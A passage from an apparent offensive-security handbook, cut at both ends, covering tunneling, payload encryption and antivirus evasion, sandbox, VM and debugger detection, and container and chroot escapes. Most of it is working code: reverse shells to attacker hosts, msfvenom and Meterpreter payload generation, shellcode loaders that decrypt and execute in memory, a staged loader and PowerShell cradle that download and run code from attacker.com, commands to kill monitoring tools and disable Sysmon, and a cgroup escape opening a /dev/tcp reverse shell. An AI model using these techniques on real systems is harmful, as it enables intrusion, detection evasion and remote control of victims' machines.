proxychains nmap -sT <internal_target>

# Chisel port forwarding
chisel client <attacker_ip>:8080 R:8000:localhost:80
```

**DNS Tunneling:**

```bash
# dnscat2 for DNS-based C2
# On attacker (server)
dnscat2 --dns "domain=tunnel.example.com,host=0.0.0.0,port=53"

# On target (client)
./dnscat tunnel.example.com

# iodine for IP-over-DNS
# Server setup
iodined -f 10.0.0.1 tunnel.example.com

# Client connection
iodine -f <dns_server_ip> tunnel.example.com

# Creates tun interface for routing
route add -net <target_network> gw 10.0.0.1
```

**ICMP Tunneling:**

```bash
# ptunnel - Tunnel TCP over ICMP
# On relay/server host
ptunnel -x <password>

# On client
ptunnel -p <relay_host> -lp <local_port> -da <destination_host> -dp <destination_port> -x <password>

# Example: Access SSH through ICMP
ptunnel -p relay.example.com -lp 2222 -da internal.target.com -dp 22 -x secret123
ssh -p 2222 localhost

# icmptunnel alternative
# Server
icmptunnel -s

# Client  
icmptunnel -c <server_ip>
```

**VPN Tunneling:**

```bash
# OpenVPN over TCP port 443 (HTTPS-like)
openvpn --config client.ovpn --proto tcp --port 443

# Wireguard tunnel setup
# Generate keys
wg genkey | tee privatekey | wg pubkey > publickey

# Server configuration (/etc/wireguard/wg0.conf)
[Interface]
Address = 10.0.0.1/24
PrivateKey = <server_private_key>
ListenPort = 51820

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32

# Start tunnel
wg-quick up wg0

# Client configuration
[Interface]
Address = 10.0.0.2/24
PrivateKey = <client_private_key>

[Peer]
PublicKey = <server_public_key>
Endpoint = <server_ip>:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
```

**HTTP CONNECT Proxy Tunneling:**

```bash
# Using corkscrew through HTTP proxy
# Add to ~/.ssh/config
Host target-behind-proxy
    ProxyCommand corkscrew <proxy_host> <proxy_port> %h %p

# Connect through proxy
ssh target-behind-proxy

# Manual CONNECT request
nc <proxy_host> <proxy_port>
CONNECT <target>:443 HTTP/1.1
Host: <target>:443

# proxytunnel for HTTPS tunneling
proxytunnel -p <proxy>:8080 -d <target>:22 -a 8022
ssh -p 8022 localhost
```

**SOCKS Proxy Chaining:**

```bash
# proxychains configuration (/etc/proxychains.conf)
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 9050
http 10.0.0.1 8080
socks4 192.168.1.50 1080

# Use with any tool
proxychains nmap -sT -Pn <target>
proxychains msfconsole
proxychains curl http://<target>

# Test proxy chain
proxychains curl ifconfig.me
```

**Application-Layer Tunnels:**

```bash
# socat for flexible tunneling
# TCP to TCP relay
socat TCP-LISTEN:8080,fork TCP:<target>:80

# Encrypted relay
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:<target>:22

# UDP to TCP conversion
socat TCP-LISTEN:53,fork UDP:<dns_server>:53

# reGeorg web shell tunneling
# Upload reGeorg web shell, then:
python reGeorgSocksProxy.py -p 9050 -u http://<target>/tunnel.aspx

# Use created SOCKS proxy
proxychains nmap -sT <internal_target>
```

**Port Knocking for Tunnel Activation:**

```bash
# Send knock sequence to open firewall
knock <target> 7000 8000 9000

# After successful knock, establish tunnel
ssh -D 9050 user@<target>

# Automated knock and connect
knock <target> 7000 8000 9000 && ssh -D 9050 user@<target>

# knockd configuration on target (/etc/knockd.conf)
[openSSH]
sequence = 7000,8000,9000
seq_timeout = 5
command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT

[closeSSH]
sequence = 9000,8000,7000
seq_timeout = 5
command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

### Encryption of Payloads

Encrypted payloads evade signature-based detection systems by rendering payload content unreadable without decryption, while maintaining functional exploits.

**SSL/TLS Encrypted Shells:**

```bash
# Ncat with SSL (listener)
ncat --ssl -lvp 443

# Ncat with SSL (client)
ncat --ssl <attacker_ip> 443 -e /bin/bash

# OpenSSL reverse shell (listener)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

# OpenSSL reverse shell (target)
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <attacker_ip>:443 > /tmp/s; rm /tmp/s
```

**Metasploit Encrypted Payloads:**

```bash
msfconsole

# HTTPS Meterpreter payload
use payload/windows/meterpreter/reverse_https
set LHOST <attacker_ip>
set LPORT 443
generate -f exe -o payload.exe

# With custom certificate
set HandlerSSLCert /path/to/cert.pem
set StagerVerifySSLCert true

# Multi-handler with encryption
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST <attacker_ip>
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
exploit -j

# DNS TXT record payloads (encoded)
use payload/windows/meterpreter/reverse_dns_txt
set LHOST attacker.example.com
generate
```

**Custom Payload Encryption:**

```python
from cryptography.fernet import Fernet
import base64

# Generate encryption key
key = Fernet.generate_key()
cipher = Fernet(key)

# Read shellcode
with open('payload.bin', 'rb') as f:
    shellcode = f.read()

# Encrypt payload
encrypted = cipher.encrypt(shellcode)

# Generate stub (decrypts at runtime)
stub = f'''
import base64
from cryptography.fernet import Fernet

key = {key}
encrypted_payload = {encrypted}

cipher = Fernet(key)
shellcode = cipher.decrypt(encrypted_payload)

# Execute shellcode
import ctypes
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
'''

with open('encrypted_payload.py', 'w') as f:
    f.write(stub)
```

**XOR Encoding for Basic Obfuscation:**

```bash
# msfvenom with XOR encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Multiple encoding iterations
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=443 -e x86/shikata_ga_nai -i 5 -e x86/countdown -i 3 -f elf -o payload.elf

# Custom format with encoding
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -e x86/shikata_ga_nai -f c

# Avoid bad characters with encoding
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -f python
```

**AES Encryption for Payloads:**

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import base64

# Encryption function
def encrypt_payload(payload, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(payload, AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return iv, ct

# Decryption stub (embedded in dropper)
def decrypt_payload(iv, ct, key):
    iv = base64.b64decode(iv)
    ct = base64.b64decode(ct)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    payload = unpad(cipher.decrypt(ct), AES.block_size)
    return payload

# Generate key and encrypt
key = get_random_bytes(32)
with open('shellcode.bin', 'rb') as f:
    shellcode = f.read()

iv, encrypted = encrypt_payload(shellcode, key)

print(f"Key: {base64.b64encode(key).decode()}")
print(f"IV: {iv}")
print(f"Encrypted: {encrypted}")
```

**RC4 Stream Cipher Encoding:**

```python
def rc4_crypt(data, key):
    S = list(range(256))
    j = 0
    out = []
    
    # KSA Phase
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    # PRGA Phase
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
    
    return bytes(out)

# Encrypt shellcode
key = b"MySecretKey123"
with open('payload.bin', 'rb') as f:
    shellcode = f.read()

encrypted = rc4_crypt(shellcode, key)

# Dropper decrypts using same function
with open('encrypted.bin', 'wb') as f:
    f.write(encrypted)
```

**Encrypting Network Traffic:**

```bash
# Stunnel for SSL wrapping
# Server configuration (/etc/stunnel/stunnel.conf)
[reverse_shell]
accept = 443
connect = 127.0.0.1:4444
cert = /etc/stunnel/stunnel.pem

# Start stunnel
stunnel /etc/stunnel/stunnel.conf

# Metasploit handler on localhost
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
exploit

# Client-side stunnel forwards to SSL endpoint
stunnel -c -d 127.0.0.1:5555 -r <attacker_ip>:443
```

**Obfuscated PowerShell Payloads:**

```powershell
# Base64 encoded payload
$payload = 'IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

# Execute encoded
powershell -EncodedCommand $encoded

# AES encrypted PowerShell
$key = (1..32 | ForEach-Object { Get-Random -Maximum 256 })
$secureString = ConvertTo-SecureString $payload -AsPlainText -Force
$encrypted = ConvertFrom-SecureString $secureString -Key $key

# Decryption stub
$secure = ConvertTo-SecureString $encrypted -Key $key
$ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
$payload = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($ptr)
IEX $payload
```

**Polymorphic Payload Generation:**

```bash
# Veil Framework for AV evasion
veil

# Select Evasion
use evasion

# List available payloads
list

# Use encrypted payload
use c/meterpreter/rev_tcp
set LHOST <attacker_ip>
set LPORT 443
generate

# Hyperion PE crypter
wine hyperion.exe payload.exe encrypted_payload.exe

# [Unverified]: Effectiveness depends on current AV signatures
```

**Staged Payload Encryption:**

```python
# Stage 1: Small encrypted loader
stage1 = '''
import urllib.request, base64
from cryptography.fernet import Fernet

key = b'<base64_key>'
url = 'http://attacker.com/stage2.enc'

data = urllib.request.urlopen(url).read()
cipher = Fernet(key)
stage2 = cipher.decrypt(data)
exec(stage2)
'''

# Stage 2: Full payload (encrypted on server)
# Fetched and decrypted at runtime
# Only loader crosses IDS/IPS
```

**Encrypting C2 Communications:**

```bash
# Covenant C2 with encrypted profiles
# Supports HTTP/HTTPS with custom encryption

# Empire C2 encrypted comms
use stager multi/launcher
set Listener https_listener
set Bypasses mattifestation etw
generate

# Custom C2 encryption layer
# [Inference]: Most modern C2 frameworks implement TLS/HTTPS by default
# Additional encryption layers (AES, ChaCha20) add defense-in-depth
```

**Certificate Pinning for Encrypted Channels:**

```python
import ssl
import socket

# Client with certificate pinning
context = ssl.create_default_context()
context.load_verify_locations('server-cert.pem')
context.check_hostname = False
context.verify_mode = ssl.CERT_REQUIRED

sock = socket.create_connection(('attacker.com', 443))
ssock = context.wrap_socket(sock, server_hostname='attacker.com')

# Send encrypted data
ssock.send(b'encrypted payload data')
```

---

**Important Related Subtopics:**

- **Protocol Manipulation**: Crafting packets with unusual flags or malformed headers to bypass inspection
- **Timing-Based Evasion**: Using scan delays, throttling, and fragmentation timing
- **Application-Layer Gateways (ALG) Bypass**: Evading stateful inspection in modern firewalls
- **Covert Channels**: Steganography, timing channels, and protocol field manipulation for data exfiltration

---

## Behavioral Analysis Evasion

### Timing Delays in Exploitation

Behavioral analysis systems monitor malicious activity by observing execution patterns over time. Timing delays exploit the resource constraints and time-limited nature of automated analysis environments.

**Sleep-Based Evasion**

Basic sleep commands introduce execution delays:

```bash
# Linux/Unix
sleep 300  # 5 minute delay
python3 -c "import time; time.sleep(300)"
perl -e 'sleep 300'

# Windows
timeout /t 300
ping -n 301 127.0.0.1 > nul  # Approx 300 seconds
powershell -c "Start-Sleep -Seconds 300"
```

**Conditional Timing Techniques**

More sophisticated approaches check system uptime or perform computationally intensive operations:

```python
# Python uptime check
import time
import os

# Check if system has been running for sufficient time
with open('/proc/uptime', 'r') as f:
    uptime_seconds = float(f.readline().split()[0])
    if uptime_seconds < 600:  # Less than 10 minutes
        exit()  # Likely sandbox

# CPU-intensive delay (appears legitimate)
def cpu_delay(iterations=10000000):
    result = 0
    for i in range(iterations):
        result += i ** 2
    return result
```

```powershell
# PowerShell uptime check (Windows)
$uptime = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
if ($uptime.TotalMinutes -lt 10) { exit }

# Alternative: Check process list age
$proc = Get-Process | Where-Object {$_.StartTime} | 
        Measure-Object -Property StartTime -Minimum
if (((Get-Date) - $proc.Minimum).TotalMinutes -lt 5) { exit }
```

**Time-Based Triggers**

Execute payload only during specific conditions:

```bash
# Execute only during business hours (analyst active time)
current_hour=$(date +%H)
if [ $current_hour -lt 9 ] || [ $current_hour -gt 17 ]; then
    exit
fi

# Execute only on specific date
target_date="2025-11-01"
current_date=$(date +%Y-%m-%d)
if [ "$current_date" != "$target_date" ]; then
    exit
fi
```

**[Inference]** Sandboxes typically have analysis timeouts between 2-5 minutes for resource efficiency, though this varies by implementation. Extended delays beyond these windows may bypass detection.

---

### Virtual Machine Detection and Bypass

VM detection identifies artifacts that distinguish virtualized environments from physical hardware. Different hypervisors leave distinct fingerprints.

**Linux VM Detection**

```bash
# Check for virtualization artifacts
systemd-detect-virt  # Systemd's built-in detector
virt-what           # Comprehensive VM detection tool

# DMI/SMBIOS checks
dmidecode -s system-manufacturer  # Look for "VMware", "QEMU", "VirtualBox"
dmidecode -s system-product-name
cat /sys/class/dmi/id/product_name
cat /sys/class/dmi/id/sys_vendor

# CPU checks
cat /proc/cpuinfo | grep -i "hypervisor"  # Hypervisor flag present
lscpu | grep "Hypervisor vendor"

# Hardware device checks
lspci | grep -i "vmware\|virtualbox\|qemu\|virtio"
lsmod | grep -i "vbox\|vmw_\|virtio"

# Disk identifiers
ls -la /dev/disk/by-id/ | grep -i "VBOX\|VMware"

# MAC address prefixes (common VM vendors)
# VMware: 00:05:69, 00:0C:29, 00:50:56
# VirtualBox: 08:00:27
# Xen: 00:16:3E
ip link show | grep "link/ether"
```

**Windows VM Detection**

```powershell
# WMIC queries
wmic bios get manufacturer,serialnumber,version
wmic computersystem get manufacturer,model
wmic baseboard get manufacturer,product

# Registry checks
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Disk\Enum" | 
    Select-Object -ExpandProperty 0  # Check for VM disk identifiers

Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters" -ErrorAction SilentlyContinue

# Driver detection
Get-WmiObject Win32_PnPEntity | Where-Object {
    $_.Name -match "vmware|vbox|qemu|xen|virtio"
}

# Process checks
Get-Process | Where-Object {
    $_.Name -match "vmtoolsd|vboxservice|vboxtray|xenservice"
}

# Timing-based detection (CPU instruction timing differs in VMs)
# [Unverified - implementation-specific behavior]
Measure-Command { 1..1000 | ForEach-Object { $_ * $_ } }
```

**Advanced Detection Techniques**

CPU instruction timing differences:

```c
// CPUID instruction check (x86/x64)
#include <cpuid.h>
#include <stdbool.h>

bool is_vm_cpuid() {
    unsigned int eax, ebx, ecx, edx;
    __get_cpuid(1, &eax, &ebx, &ecx, &edx);
    
    // Check hypervisor bit (bit 31 of ECX)
    return (ecx >> 31) & 1;
}

// Get hypervisor vendor string
void get_hypervisor_vendor(char *vendor) {
    unsigned int eax, ebx, ecx, edx;
    __get_cpuid(0x40000000, &eax, &ebx, &ecx, &edx);
    
    // Vendor string in EBX, ECX, EDX
    memcpy(vendor, &ebx, 4);
    memcpy(vendor + 4, &ecx, 4);
    memcpy(vendor + 8, &edx, 4);
    vendor[12] = '\0';
    // Examples: "VMwareVMware", "KVMKVMKVM", "Microsoft Hv"
}
```

**VM Detection Bypass Strategies**

```bash
# Modify VM artifacts (requires root/admin)
# VMware example - hide from common checks
echo "isolation.tools.getPtrLocation.disable = TRUE" >> /etc/vmware-tools/tools.conf
echo "isolation.tools.setPtrLocation.disable = TRUE" >> /etc/vmware-tools/tools.conf
echo "isolation.tools.setVersion.disable = TRUE" >> /etc/vmware-tools/tools.conf
echo "isolation.tools.getVersion.disable = TRUE" >> /etc/vmware-tools/tools.conf

# Change MAC address to non-VM prefix
ip link set dev eth0 down
ip link set dev eth0 address 00:1A:2B:3C:4D:5E
ip link set dev eth0 up

# Modify SMBIOS strings (requires hypervisor access)
# VirtualBox example:
VBoxManage setextradata "VM_Name" "VBoxInternal/Devices/pcbios/0/Config/DmiBIOSVendor" "American Megatrends Inc."
VBoxManage setextradata "VM_Name" "VBoxInternal/Devices/pcbios/0/Config/DmiSystemProduct" "System Product Name"
```

```powershell
# Windows: Modify registry artifacts (requires admin)
# Hide VMware tools
Set-Service -Name "VMTools" -StartupType Disabled -ErrorAction SilentlyContinue
Stop-Service -Name "VMTools" -Force -ErrorAction SilentlyContinue

# Rename/hide VM processes (requires process manipulation)
# [Unverified - depends on specific implementation and may not fully bypass detection]
```

**Multi-Factor VM Detection Script**

```python
#!/usr/bin/env python3
import os
import subprocess
import re

def check_vm_artifacts():
    indicators = []
    
    # Check DMI information
    try:
        dmi_check = subprocess.check_output(
            ['dmidecode', '-s', 'system-manufacturer'],
            stderr=subprocess.DEVNULL
        ).decode().strip().lower()
        
        vm_keywords = ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'bochs']
        if any(keyword in dmi_check for keyword in vm_keywords):
            indicators.append(f"DMI: {dmi_check}")
    except:
        pass
    
    # Check kernel modules
    try:
        lsmod = subprocess.check_output(['lsmod']).decode()
        vm_modules = ['vboxguest', 'vmw_balloon', 'virtio']
        loaded = [mod for mod in vm_modules if mod in lsmod]
        if loaded:
            indicators.append(f"Modules: {loaded}")
    except:
        pass
    
    # Check MAC address
    try:
        mac_prefixes = {
            '00:05:69': 'VMware',
            '00:0c:29': 'VMware',
            '00:50:56': 'VMware',
            '08:00:27': 'VirtualBox',
            '00:16:3e': 'Xen'
        }
        
        mac_output = subprocess.check_output(['ip', 'link', 'show']).decode()
        for prefix, vendor in mac_prefixes.items():
            if prefix in mac_output.lower():
                indicators.append(f"MAC: {vendor}")
    except:
        pass
    
    # Check /proc/cpuinfo
    try:
        with open('/proc/cpuinfo', 'r') as f:
            if 'hypervisor' in f.read().lower():
                indicators.append("CPU: hypervisor flag")
    except:
        pass
    
    return indicators

# Usage
vm_indicators = check_vm_artifacts()
if vm_indicators:
    print(f"VM detected: {vm_indicators}")
    exit()  # Terminate in sandbox
else:
    print("Physical system detected, proceeding...")
    # Continue exploitation
```

---

### Analyst Tool Detection and Bypass

Analyst tools (debuggers, process monitors, network analyzers) create detectable artifacts in system state.

**Debugger Detection (Linux)**

```bash
# Check if being traced via ptrace
grep TracerPid /proc/self/status | grep -v "TracerPid:\s0"

# Check for common debuggers in process list
ps aux | grep -E "gdb|strace|ltrace|radare2|ida"

# Detect LD_PRELOAD (often used for monitoring)
if [ ! -z "$LD_PRELOAD" ]; then
    echo "LD_PRELOAD detected"
    exit
fi
```

```c
// Anti-debugging via ptrace (Linux)
#include <sys/ptrace.h>
#include <stdio.h>
#include <stdlib.h>

void anti_debug() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        printf("Debugger detected!\n");
        exit(1);
    }
    // Can only be traced once; debugger attach will fail
}

// Check /proc/self/status for TracerPid
#include <stdio.h>
#include <string.h>

int check_tracer() {
    FILE *fp = fopen("/proc/self/status", "r");
    char line[256];
    
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            int pid;
            sscanf(line, "TracerPid: %d", &pid);
            fclose(fp);
            return pid != 0;  // Non-zero means being traced
        }
    }
    fclose(fp);
    return 0;
}
```

**Debugger Detection (Windows)**

```cpp
// Windows API anti-debugging techniques
#include <windows.h>
#include <stdio.h>

// IsDebuggerPresent API
if (IsDebuggerPresent()) {
    printf("Debugger detected via IsDebuggerPresent\n");
    ExitProcess(1);
}

// CheckRemoteDebuggerPresent
BOOL debuggerPresent = FALSE;
CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
if (debuggerPresent) {
    printf("Remote debugger detected\n");
    ExitProcess(1);
}

// PEB (Process Environment Block) check
BOOL IsDebuggedPEB() {
    BOOL found = FALSE;
    __asm {
        mov eax, fs:[30h]    ; Get PEB address
        mov al, [eax + 2h]   ; BeingDebugged flag offset
        mov found, al
    }
    return found;
}

// NtQueryInformationProcess
typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(
    HANDLE, UINT, PVOID, ULONG, PULONG
);

BOOL CheckDebugPort() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)
        GetProcAddress(hNtdll, "NtQueryInformationProcess");
    
    DWORD debugPort = 0;
    NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
    // ProcessDebugPort = 7, returns -1 if debugged
    return debugPort != 0;
}
```

**Process Monitor Detection**

```bash
# Linux: Detect common monitoring tools
# Strace detection (checks if syscalls are being traced)
if grep -q "strace" /proc/$$/cmdline 2>/dev/null; then
    exit
fi

# Detect Sysdig, Falco, or other eBPF-based monitors
ls /sys/kernel/debug/tracing/events/ 2>/dev/null && echo "Tracing active"

# Check for audit daemon
systemctl is-active auditd >/dev/null 2>&1 && echo "Auditd active"
```

```powershell
# Windows: Process monitoring detection
# Check for Process Monitor (Procmon)
Get-Process | Where-Object { $_.Name -match "procmon|procexp|procdump" }

# Check for Sysmon
Get-Service | Where-Object { $_.Name -eq "Sysmon" }
Get-Process | Where-Object { $_.Name -eq "Sysmon64" }

# API Monitor detection
Get-Process | Where-Object { $_.Name -match "apimonitor|api-monitor" }

# WinDbg detection
Get-Process | Where-Object { $_.Name -match "windbg|cdb|ntsd" }
```

**Network Analysis Tool Detection**

```bash
# Check for Wireshark/tcpdump
ps aux | grep -E "wireshark|tcpdump|tshark" | grep -v grep

# Check if interface is in promiscuous mode (packet sniffing)
ip link show | grep PROMISC

# Alternative promiscuous mode check
cat /sys/class/net/*/flags | while read flags; do
    # Flags & 0x100 checks for IFF_PROMISC
    if [ $(($flags & 0x100)) -ne 0 ]; then
        echo "Promiscuous mode detected"
    fi
done
```

```powershell
# Windows: Network monitor detection
# Check for Wireshark
Get-Process | Where-Object { $_.Name -match "wireshark|dumpcap" }

# Check for installed WinPcap/Npcap drivers
Get-WmiObject Win32_SystemDriver | Where-Object {
    $_.Name -match "npf|npcap"
}

# Fiddler detection
Get-Process | Where-Object { $_.Name -match "fiddler" }
Test-Path "HKCU:\Software\Microsoft\Fiddler2" -ErrorAction SilentlyContinue
```

**Anti-Analysis Bypass Strategies**

```python
#!/usr/bin/env python3
import os
import sys
import ctypes

def bypass_debugger_checks():
    """
    [Inference] Multiple evasion layers increase bypass success rate
    """
    # Technique 1: Code obfuscation
    # Makes static analysis harder
    exec(compile("print('Obfuscated')", '<string>', 'exec'))
    
    # Technique 2: Environment sanitization
    # Remove debugging variables
    env_vars = ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'PYTHONDEBUG']
    for var in env_vars:
        if var in os.environ:
            del os.environ[var]
    
    # Technique 3: Timing-based detection evasion
    # Debuggers slow execution; measure time
    import time
    start = time.time()
    for _ in range(1000000):
        pass
    elapsed = time.time() - start
    
    # [Unverified - threshold values vary by hardware and VM configuration]
    if elapsed > 0.5:  # Suspiciously slow
        sys.exit(1)
    
    # Technique 4: Multi-process architecture
    # Fork to separate monitored/unmonitored contexts
    if os.fork() == 0:  # Child process
        # Perform sensitive operations here
        # Parent may be monitored, child might evade
        os._exit(0)

# Windows anti-debugging bypass
def patch_debugger_checks_windows():
    """
    [Unverified - requires specific memory addresses and may not work across systems]
    Patch anti-debugging checks in memory
    """
    # Patch IsDebuggerPresent return value
    # This is a conceptual example; actual implementation requires
    # knowing exact memory addresses and may trigger additional protections
    
    kernel32 = ctypes.windll.kernel32
    # Force IsDebuggerPresent to always return False
    # Real implementation would use VirtualProtect + direct memory writes
    pass
```

**Tool-Specific Bypasses**

```bash
# Bypass strace on Linux
# Strace cannot trace itself
strace -f -e trace=none /path/to/payload  # Traces nothing

# Detect and kill monitoring processes (requires privileges)
pkill -9 strace ltrace gdb wireshark

# Use anti-debugging code sections
# Example: Self-modifying code that breaks under debugging
```

```powershell
# Windows: Terminate analyst tools (requires admin)
$analyst_tools = @('procmon64', 'procexp64', 'tcpview', 'wireshark', 
                   'x64dbg', 'ollydbg', 'windbg')
Get-Process | Where-Object { 
    $analyst_tools -contains $_.Name.ToLower() 
} | Stop-Process -Force

# Disable Sysmon (requires admin)
Stop-Service Sysmon -Force
Set-Service Sysmon -StartupType Disabled
```

---

### Sandbox Escape Techniques

Sandbox escape involves breaking out of restricted execution environments to gain host system access. Techniques vary significantly based on sandbox implementation.

**Container Escape (Docker/Linux)**

```bash
# Check if running in Docker container
if [ -f "/.dockerenv" ]; then
    echo "Docker container detected"
fi
grep -q docker /proc/1/cgroup && echo "In container"

# Privileged container check
# Privileged containers can access host devices
if [ -c "/dev/kmsg" ]; then
    echo "Privileged container - host access possible"
fi

# Check for dangerous capabilities
capsh --print | grep Current

# Escape via mounted Docker socket (if accessible)
if [ -S "/var/run/docker.sock" ]; then
    # Can control Docker daemon from inside container
    docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs
fi
```

**Docker Privileged Container Escape**

```bash
# Technique 1: Direct device access
# List available devices
ls -la /dev

# Mount host filesystem via block device
mkdir /mnt/host
mount /dev/sda1 /mnt/host  # Requires privileged mode
chroot /mnt/host /bin/bash

# Technique 2: Exploit CVE-2019-5736 (runc vulnerability)
# [Unverified - requires specific runc version < 1.0-rc6]
# Overwrites runc binary on host when exec is called

# Technique 3: Kernel module loading (privileged containers)
# Create malicious kernel module
cat > escape.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int __init escape_init(void) {
    // Execute arbitrary code at kernel level
    return 0;
}

static void __exit escape_exit(void) {
}

module_init(escape_init);
module_exit(escape_exit);
MODULE_LICENSE("GPL");
EOF

# Compile and load (requires privileged container)
# [Inference] This technique bypasses container isolation by executing in kernel context
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
insmod escape.ko
```

**Capability-Based Escape**

```bash
# Check container capabilities
capsh --print

# CAP_SYS_ADMIN escape (if granted)
# Allows mounting host filesystem
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Find host path
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Write payload
echo '#!/bin/sh' > /cmd
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /cmd
chmod +x /cmd

# Trigger escape
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Virtual Machine Escape**

```bash
# VMware shared folders exploitation
# If VMware tools installed and shared folders enabled
ls /mnt/hgfs/  # Shared folders accessible

# Check for VMware backdoor command interface
# [Unverified - depends on specific VMware version and configuration]
# Historical vulnerabilities in vmware-vmx process
```

**Browser Sandbox Escape (Conceptual)**

```javascript
// [Inference] Modern browser sandboxes use multiple layers:
// - Renderer process sandbox (syscall filtering)
// - Site isolation
// - GPU process isolation

// Detection of sandboxed environment (JavaScript)
const isSandboxed = () => {
    try {
        // Attempt restricted operations
        const fs = require('fs'); // Node.js context
        return false; // If successful, not fully sandboxed
    } catch (e) {
        return true; // Sandboxed - no filesystem access
    }
};

// Typical escape chain (theoretical):
// 1. Renderer exploit (RCE in sandbox)
// 2. Sandbox escape (elevation exploit)
// 3. Privilege escalation (kernel exploit)
```

**Chroot Jail Escape**

```bash
# Check if in chroot
if [ "$(stat -c %i /)" -ne 2 ]; then
    echo "Possibly in chroot"
fi

# Escape via nested chroot (requires root in jail)
mkdir /tmp/escape
cd /tmp/escape
mkdir root
cp /bin/bash root/

# Create device nodes
mknod root/dev/console c 5 1
mknod root/dev/null c 1 3
mknod root/dev/zero c 1 5
mknod root/dev/tty c 5 0
mknod root/dev/random c 1 8
mknod root/dev/urandom c 1 9

# Perform escape
chroot root /bash
cd ../../../../../../../../
chroot . /bin/bash
```

```c
// Programmatic chroot escape (requires root)
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

void escape_chroot() {
    int dir_fd, x;
    struct stat sbuf;
    
    // Create temp directory
    mkdir(".42", 0755);
    chroot(".42");
    chdir(".42");
    
    // Traverse upwards
    for (x = 0; x < 1000; x++) {
        chdir("..");
    }
    
    // Break out
    chroot(".");
    // Now outside original chroot
}
```

**Python Sandbox Escape**

```python
# Restricted Python environment escape techniques

# Technique 1: Access to dangerous builtins
# If __builtins__ not properly restricted
__builtins__.__dict__['__import__']('os').system('whoami')

# Technique 2: Object introspection
# Navigate object hierarchy to find unrestricted objects
().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('whoami')

# Technique 3: File object abuse
# If file operations allowed
open('/etc/passwd').read()

# Technique 4: Code object manipulation
# [Unverified - depends on Python version and restriction implementation]
func_code = compile('import os; os.system("whoami")', '<string>', 'exec')
exec(func_code)
```

**Seccomp Bypass (Linux)**

```c
// Seccomp restricts available syscalls
// Check if seccomp is active
#include <stdio.h>
#include <linux/seccomp.h>
#include <sys/prctl.h>

int check_seccomp() {
    int status = prctl(PR_GET_SECCOMP);
    if (status == 0) {
        printf("Seccomp disabled\n");
    } else if (status == 1) {
        printf("Seccomp strict mode\n");
    } else if (status == 2) {
        printf("Seccomp filter mode\n");
    }
    return status;
}

// Bypass techniques (limited):
// 1. Use allowed syscalls only (write exploitation using permitted calls)
// 2. ROP to bypass filter before payload execution
// 3. Exploit seccomp-bpf filter logic bugs
// [Unverified - success depends on specific filter configuration]
```

**QEMU/KVM Virtual Machine Escape**

```bash
